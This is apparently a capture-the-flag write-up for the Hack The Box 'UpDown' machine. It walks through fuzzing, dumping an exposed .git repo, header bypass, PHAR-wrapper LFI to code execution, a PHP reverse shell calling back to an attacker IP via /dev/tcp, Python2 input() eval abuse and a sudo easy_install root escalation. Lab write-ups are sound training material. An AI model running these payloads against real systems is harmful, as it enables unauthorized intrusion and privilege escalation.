1,Recon
port scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Page check
![](images/Pasted%20image%2020250206143618.png)
I guess there is something about command injection, so I try the payload `127.0.0.1;id`
But it gives me the message `Hacking attempt was detected !`
And it is detected by the back end and i try to find the restricted symbol is `;` or any format that is not an IP address.

There is also some hints `siteisup.htb`, I can enumerate all the valid sub-domains here.
`ffuf -u http://siteisup.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.siteisup.htb" -fs 1131`
Then we get the sub-domain `dev.siteisup.htb`
But we can only get code 403 Forbidden for `http://dev.siteisup.htb`

By enumerating the web-contents of the main domain `http://siteisup.htb`
```
ffuf -u http://siteisup.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://siteisup.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 17ms]
                        [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 1906ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2021ms]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2044ms]
dev                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 10ms]
index.php               [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 15ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 7ms]
:: Progress: [4614/4614] :: Job [1/1] :: 1142 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

```

Continue to enumerate `/dev`
```
ffuf -u http://siteisup.htb/dev/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://siteisup.htb/dev/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 14ms]
.git/HEAD               [Status: 200, Size: 21, Words: 2, Lines: 2, Duration: 17ms]
index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 16ms]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1257ms]
                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1260ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1261ms]
:: Progress: [4614/4614] :: Job [1/1] :: 75 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

`.git/HEAD` would be our target and we can use git-dumper to catch it to our local machine.
```
git-dumper http://siteisup.htb/dev/.git/ ./git-repo-dump
```
Then we get
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/UpDown/git-repo-dump]
└─$ ls -al           
total 40
drwxrwxr-x 3 wither wither 4096 Feb  6 14:51 .
drwxrwxr-x 4 wither wither 4096 Feb  6 14:51 ..
drwxrwxr-x 7 wither wither 4096 Feb  6 14:51 .git
-rw-rw-r-- 1 wither wither  117 Feb  6 14:51 .htaccess
-rw-rw-r-- 1 wither wither   59 Feb  6 14:51 admin.php
-rw-rw-r-- 1 wither wither  147 Feb  6 14:51 changelog.txt
-rw-rw-r-- 1 wither wither 3145 Feb  6 14:51 checker.php
-rw-rw-r-- 1 wither wither  273 Feb  6 14:51 index.php
-rw-rw-r-- 1 wither wither 5531 Feb  6 14:51 stylesheet.css
```
From `.htaccess` we can know why we are forbidden of the sub-domain `dev`
```
cat .htaccess 
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```
Base on on the source code analysis, there are a few things I can try. First, I’ll use an extension like Modify Header Value to set a the custom header:
![](images/Pasted%20image%2020250206150857.png)
Then we can get the page:
![](images/Pasted%20image%2020250206150924.png)


From `index.php` and`admin.php` we can find LFI exploit in the `?page=`
```
index.php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
        define("DIRECTACCESS",false);
        $page=$_GET['page'];
        if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
                include($_GET['page'] . ".php");
        }else{
                include("checker.php");
        }
?>

admin.php
<?php
if(DIRECTACCESS){
        die("Access Denied");
}

#ToDo
?>
```
But seems like not worked here.

Let's continue to check the `checker.php`
```
<?php

function isitup($url){
	$ch=curl_init();
	curl_setopt($ch, CURLOPT_URL, trim($url));
	curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$f = curl_exec($ch);
	$header = curl_getinfo($ch);
	if($f AND $header['http_code'] == 200){
		return array(true,$f);
	}else{
		return false;
	}
    curl_close($ch);
}

In this place, $f = curl_exec($ch); is the exec function.But it could not make a command injection here.

if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
	
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
  
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
Here we can find the uploaded files path $dir = "uploads/".md5(time())."/";
And we could not upload the php files directly here,
```
![](images/Pasted%20image%2020250206151736.png)
Typically I think of needing a file to end in .php (or .ph3 or another known PHP extension to get execution). I also have to get around the fact that the script is going to add .php to the parameter I pass in.
I’m going to abuse the PHP Archive or PHAR format to get execution here. This is very similar to abusing the zip PHP stream wrapper way back in CrimeStoppers. The phar:// wrapper works with the format phar://[archive path]/[file inside the archive]. This means I can craft a URL that points to `phar://info.wither/info.php` (where I’ll let the site add the .php to the end), and that file will be run from within the archive.

To test this, I’ll try creating a file that just calls `phpinfo`, and call it `phpinfo.php`:
`<?php phpinfo(); ?>`
put it into a zip archive and upload it.
Now on visiting `http://dev.siteisup.htb/?page=phar://uploads/a26d8923adbfe58243ff1fe2b12d30a4/phpinfo.wither/phpinfo`
![](images/Pasted%20image%2020250206154718.png)
Then we can check the `disable_functions`
```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
```
These functions won’t work, and include most of the ones necessary to get execution. However, I could notice that proc_open isn’t listed.
So we can make the payload
```
rev.php
<?php
        $descspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
        );
        $cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.5/443 0>&1'";
        $proc = proc_open($cmd, $descspec, $pipes);
?>
```
Continue like before, put it into a zip archive and upload it.
Remember to open the netcat and visit `http://dev.siteisup.htb/?page=phar://uploads/c37609fba8ab772c12b98dbf4ef02092/rev.wither/rev`

Then we can get the reverse shell as `www-data`

By enumerating all the files of `/var/www/dev` and `/var/www/html`, there is nothing useful from that, there is no config files or database to help us get the certifcation.

But we can direct into `/home/developer`, and we can check the files of `/dev`
```
siteisup  siteisup_test.py

file siteisup
siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped

cat siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```
The print calls use space in a way that show this is expecting to run with Python2. But if this is called with Python2, that input will be a major vulnerability.
That’s because in Python2, input takes the input and passes it to eval, and my input isn’t valid python. I can pass it a one liner that will execute and get execution:
![](images/Pasted%20image%2020250206160657.png)

Actually we can not run correctly any of them, they always broken down.
```
www-data@updown:/home/developer/dev$ ./siteisup
./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:http://127.0.0.1
http://127.0.0.1
Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 3, in <module>
    url = input("Enter URL here:")
  File "<string>", line 1
    http://127.0.0.1
        ^
SyntaxError: invalid syntax

www-data@updown:/home/developer/dev$ python2 siteisup_test.py 
Enter URL here:http://10.10.14.6/test
Traceback (most recent call last):
  File "siteisup_test.py", line 3, in <module>
    url = input("Enter URL here:")
  File "<string>", line 1
    http://10.10.14.6/test
        ^
SyntaxError: invalid syntax
```

By check the binary-file
```
www-data@updown:/home/developer/dev$ strings -n 20 siteisup
strings -n 20 siteisup
/lib64/ld-linux-x86-64.so.2
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
Welcome to 'siteisup.htb' application
/usr/bin/python /home/developer/dev/siteisup_test.py
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
deregister_tm_clones
__do_global_dtors_aux
__do_global_dtors_aux_fini_array_entry
__frame_dummy_init_array_entry
_GLOBAL_OFFSET_TABLE_
_ITM_deregisterTMCloneTable
setresuid@@GLIBC_2.2.5
setresgid@@GLIBC_2.2.5
geteuid@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
getegid@@GLIBC_2.2.5
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
```
It’s calling the python script from the application.

Putting all that together, I just need to run the binary (which runs as developer) and give it the Python code to run:
```
www-data@updown:/home/developer/dev$ ./siteisup
./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('id')
__import__('os').system('id')
uid=1002(developer) gid=33(www-data) groups=33(www-data)
Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 4, in <module>
    page = requests.get(url)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 61, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 515, in request
    prep = self.prepare_request(req)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 453, in prepare_request
    hooks=merge_hooks(request.hooks, self.hooks),
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 318, in prepare
    self.prepare_url(url, params)
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 392, in prepare_url
    raise MissingSchema(error)
requests.exceptions.MissingSchema: Invalid URL '0': No scheme supplied. Perhaps you meant http://0?
```
So I’ll switch out id for bash:
```
ww-data@updown:/home/developer/dev$ ./siteisup
./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('bash')
__import__('os').system('bash')
developer@updown:/home/developer/dev$ 
 ```
Then we can check the id_rsa file of `developer` and then we can use it to ssh to developer.

3, shell as root
By check `sudo -l`
```
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```
Then I would try it 
```
developer@updown:~$ sudo /usr/local/bin/easy_install
error: No urls, filenames, or requirements specified (see --help)
developer@updown:~$ sudo /usr/local/bin/easy_install --help

Global options:
  --verbose (-v)  run verbosely (default)
  --quiet (-q)    run quietly (turns verbosity off)
  --dry-run (-n)  don't actually do anything
  --help (-h)     show detailed help message
  --no-user-cfg   ignore pydistutils.cfg in your home directory

Options for 'easy_install' command:
  --prefix                   installation prefix
  --zip-ok (-z)              install package as a zipfile
  --multi-version (-m)       make apps have to require() a version
  --upgrade (-U)             force upgrade (searches PyPI for latest versions)
  --install-dir (-d)         install package to DIR
  --script-dir (-s)          install scripts to DIR
  --exclude-scripts (-x)     Don't install scripts
  --always-copy (-a)         Copy all needed packages to install dir
  --index-url (-i)           base URL of Python Package Index
  --find-links (-f)          additional URL(s) to search for packages
  --build-directory (-b)     download/extract/build in DIR; keep the results
  --optimize (-O)            also compile with optimization: -O1 for "python -
                             O", -O2 for "python -OO", and -O0 to disable
                             [default: -O0]
  --record                   filename in which to record list of installed
                             files
  --always-unzip (-Z)        don't install as a zipfile, no matter what
  --site-dirs (-S)           list of directories where .pth files work
  --editable (-e)            Install specified packages in editable form
  --no-deps (-N)             don't install dependencies
  --allow-hosts (-H)         pattern(s) that hostnames must match
  --local-snapshots-ok (-l)  allow building eggs from local checkouts
  --version                  print version information and exit
  --no-find-links            Don't load find-links defined in packages being
                             installed
  --user                     install in user site-package
                             '/root/.local/lib/python2.7/site-packages'

usage: easy_install [options] requirement_or_url ...
   or: easy_install --help
```

It can take a URL (so I could host something malicious on my machine and fetch it), but it can also just take a directory. I’ll create a directory:
```
mkdir /tmp/wither
cd /tmp/wither
echo -e 'import os\n\nos.system("/bin/bash")' > setup.py

Then just exploit it.
sudo /usr/local/bin/easy_install /tmp/wither
```

Then we can get the root shell.

